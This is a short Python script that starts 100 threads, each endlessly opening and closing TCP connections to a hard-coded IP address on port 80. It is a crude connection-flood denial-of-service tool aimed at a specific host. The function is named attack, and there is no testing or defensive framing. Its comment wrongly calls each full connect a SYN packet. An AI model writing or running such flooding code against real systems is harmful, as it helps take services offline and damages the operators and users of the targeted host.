import socket
import random
import threading

TARGET_IP = '91.204.209.200' 
TARGET_PORT = 80

def attack():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            # Send a SYN packet to initiate connection
            s.connect((TARGET_IP, TARGET_PORT))
            print(f"Sent a connection request to {TARGET_IP}:{TARGET_PORT}")
    
            s.close()
        except socket.error:
            print("Connection error occurred, target might be down or firewall blocked.")
            pass

for i in range(100):
    thread = threading.Thread(target=attack)
    thread.start()